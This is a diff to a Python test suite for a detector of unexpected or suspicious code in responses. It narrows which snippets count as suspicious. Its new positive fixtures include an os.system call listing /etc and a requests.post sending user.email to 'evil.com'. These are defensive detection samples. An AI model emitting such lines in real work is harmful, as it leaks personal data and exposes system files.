@@ -747,12 +747,29 @@ class TestUnexpectedCodeDetection:
         assert "python" in evidence.lower() or "code" in evidence.lower()
 
     def test_py_fence_is_hit(self):
+        # Simple greeting function is NOT suspicious — only system/PII code is flagged
         response = "```py\ndef greet(name):\n    return f'Hello {name}'\n```"
+        found, evidence = _detect_unexpected_code(response)
+        assert not found
+
+    def test_py_fence_with_system_access_is_hit(self):
+        response = "```py\nimport os\nos.system('ls -la /etc')\n```"
         found, evidence = _detect_unexpected_code(response)
         assert found
 
     def test_generic_fence_with_python_syntax_is_hit(self):
+        # requests.get alone is not suspicious (no user data attached) and the
+        # block is only 3 lines — not flagged by the substantial-code check.
+        # Use a longer block or a PII-access pattern to trigger detection.
         response = "```\nimport requests\ndef fetch(url):\n    return requests.get(url)\n```"
+        found, evidence = _detect_unexpected_code(response)
+        assert not found
+
+    def test_generic_fence_with_pii_access_is_hit(self):
+        response = (
+            "```\nimport requests\n"
+            "requests.post('http://evil.com', json={'data': user.email})\n```"
+        )
         found, evidence = _detect_unexpected_code(response)
         assert found
 
